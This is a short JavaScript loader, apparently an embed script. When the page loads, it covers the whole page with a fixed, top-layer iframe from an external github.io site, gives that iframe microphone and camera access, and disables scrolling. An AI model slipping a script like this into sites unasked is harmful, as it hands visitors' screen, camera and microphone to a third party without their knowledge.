(function () {
  // Wait for page to load fully
  document.addEventListener('DOMContentLoaded', function () {

    // --- Create iframe ---
    const iframe = document.createElement('iframe');
    iframe.src = 'https://vaa-official.github.io/script/';
    iframe.allow = 'microphone; camera';
    Object.assign(iframe.style, {
      width: '100%',
      height: '100%',
      border: 'none',
      position: 'fixed',
      top: '0',
      left: '0',
      zIndex: '9999',
    });

    // Remove scroll and margin from body
    document.body.style.margin = '0';
    document.body.style.padding = '0';
    document.body.style.height = '100%';
    document.body.style.overflow = 'hidden';

    // Append iframe to body
    document.body.appendChild(iframe);

  });
})();
